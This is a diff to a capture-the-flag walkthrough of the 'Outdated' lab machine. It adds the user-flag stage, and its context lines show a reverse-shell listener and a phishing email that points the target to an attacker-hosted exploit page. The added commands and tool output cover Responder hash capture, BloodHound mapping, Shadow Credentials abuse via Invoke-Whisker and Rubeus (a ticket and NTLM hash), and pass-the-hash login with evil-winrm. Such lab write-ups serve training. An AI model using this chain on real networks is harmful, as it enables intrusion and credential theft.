@@ -309,9 +309,136 @@ And after that in the other terminal window I ran this to catch the stablize she
 
         stty raw -echo; (stty size; cat) | nc -lvnp port
         
-Then using swaks I again send the e-mail to the server pointing to the "/exploit.html" this time & got the reverse shell as user "btables".
+Then using swaks I again send the e-mail to the server pointing to the "/exploit.html" this time & got the reverse shell as user "btables". (pwn3d!🙂)
 
         swaks --to itsupport@outdated.htb --from "k4rim@0k4rim.com" --server mail.outdated.htb --header "Subject: Internal web app" --body "http://myip/exploit.html"
         
 ![image](https://user-images.githubusercontent.com/87700008/208749146-8a21362a-2e59-4d00-8fc8-dcd07f03e9ae.png)
 ![image](https://user-images.githubusercontent.com/87700008/208749360-0faa1627-c25d-487f-81da-38b4a195ef1b.png)
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+**User flag:**
+
+When checked into the desktop of the current user, didn't found the user flag in it. Also, checked the other folders as well but didn't got the flag anywhere as well. 😕
+
+![image](https://user-images.githubusercontent.com/87700008/208750566-a74e0c6b-a474-403d-81e0-71327916ce1c.png)
+
+I started checking for the system info & found that we are in a HyperVisor environment & there is another subnet of IP is present in the machine starting from 172.X
+
+![image](https://user-images.githubusercontent.com/87700008/208755285-fe42e7b5-4a07-47e3-9da3-a458d1973343.png)
+
+So, Here I just ran responder in my kali box & started listening with the responder & in the user terminal I ran command to get file from my hosted share path:
+
+        sudo responder -I tun0 -dwv
+        
+I grabbed the user hash which I may use further :
+
+![image](https://user-images.githubusercontent.com/87700008/208752711-c94546df-9fdd-41c2-b182-fc319c93b481.png)
+
+Next I executed sharphound which is transferred from my local kali machine, to get the AD network map.
+
+        sharphound.exe -c all
+
+![image](https://user-images.githubusercontent.com/87700008/208756198-5f5ddbcf-f10b-4970-b22f-970eeedde356.png)
+
+Moved the sharphound collected zip folder back to my kali machine & dropped it in my bloodhound, without any error it got uploaded successfully :
+
+![image](https://user-images.githubusercontent.com/87700008/208756358-1f50b3cf-9b8f-4360-80bd-8112429a667b.png)
+
+As per my usual approach I always search & mark the user as owned to get the shortest path for domain admin via owned principals.
+
+![image](https://user-images.githubusercontent.com/87700008/208756845-ff7ee45c-e5ad-4c14-882a-188db88bdc4e.png)
+
+Next from the bloodhound I chose the option to show "shortest path from owned principals" & got this :
+
+![image](https://user-images.githubusercontent.com/87700008/208760601-f87b9562-9346-4c8c-8e41-6f4d38e66836.png)
+
+This show that our owned user is a member of ITSTAFF group & the members of the group ITSTAFF@OUTDATED.HTB have the ability to write to the "msds-KeyCredentialLink" property on SFLOWERS@OUTDATED.HTB. Writing to this property allows an attacker to create "Shadow Credentials" on the object and authenticate as the principal using kerberos PKINIT.
+
+![image](https://user-images.githubusercontent.com/87700008/208760881-a7fe2cd4-750d-4fd4-bc92-e031c2c8f337.png)
+![image](https://user-images.githubusercontent.com/87700008/208760918-4202b6f3-dedc-43e1-9c10-cd9b2c332191.png)
+
+So, whisker is a tool for taking over Active Directory user and computer accounts by manipulating their msDS-KeyCredentialLink attribute, effectively adding "Shadow Credentials" to the target account.
+
+We will use Whisker powershell script to get the job done as per the bloodhound abuse info. Whisker ps repo : https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Whisker.ps1
+
+Moved the script into the box & invoked the whisper script then used the similar command which was shown in bloodhound, this gives us a Rubeus key to get into the "sflowers" account.
+
+        Invoke-Whisker -command "add /target:sflowers"
+        
+![image](https://user-images.githubusercontent.com/87700008/208775012-3c6f1f15-fa55-4558-967b-f136c2a70743.png)
+
+Ran this key & got the "sflowe" NTLM hash :
+
+           ______        _
+          (_____ \      | |                     
+           _____) )_   _| |__  _____ _   _  ___
+          |  __  /| | | |  _ \| ___ | | | |/___)
+          | |  \ \| |_| | |_) ) ____| |_| |___ |
+          |_|   |_|____/|____/|_____)____/(___/
+        
+          v2.2.0
+        
+        [*] Action: Ask TGT
+        
+        [*] Using PKINIT with etype rc4_hmac and subject: CN=sflowers 
+        [*] Building AS-REQ (w/ PKINIT preauth) for: 'outdated.htb\sflowers'
+        [*] Using domain controller: 172.16.20.1:88
+        [+] TGT request successful!
+        [*] base64(ticket.kirbi):
+        
+              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
+        
+          ServiceName              :  krbtgt/outdated.htb
+          ServiceRealm             :  OUTDATED.HTB
+          UserName                 :  sflowers
+          UserRealm                :  OUTDATED.HTB
+          StartTime                :  12/20/2022 11:05:44 PM
+          EndTime                  :  12/21/2022 9:05:44 AM
+          RenewTill                :  12/27/2022 11:05:44 PM
+          Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+          KeyType                  :  rc4_hmac
+          Base64(key)              :  rLrBAoPcu4HNDEhx9kLHlQ==
+          ASREP (key)              :  2E6385ECFA5C3F9D58D7A4EE9B9C29EA
+        
+        [*] Getting credentials using U2U
+        
+          CredentialInfo         :
+            Version              : 0
+            EncryptionType       : rc4_hmac
+            CredentialData       :
+              CredentialCount    : 1
+               NTLM              : 1FCDB1F6015DCB318CC77BB2BDA14DB5     
+               
+![image](https://user-images.githubusercontent.com/87700008/208783652-f6df176f-091d-4775-abd3-61d167b07350.png)
+
+Used that gathered NTLM hash to log-in via evil-winrm & logged-in successfully as "sflowers", also got the user flag here as well:
+
+        evil-winrm -i 10.10.11.175 -u sflowers -H '1FCDB1F6015DCB318CC77BB2BDA14DB5'
+       
+![image](https://user-images.githubusercontent.com/87700008/208784059-0c780be3-98fe-44ad-8d4a-7c9a3bb1cd33.png)
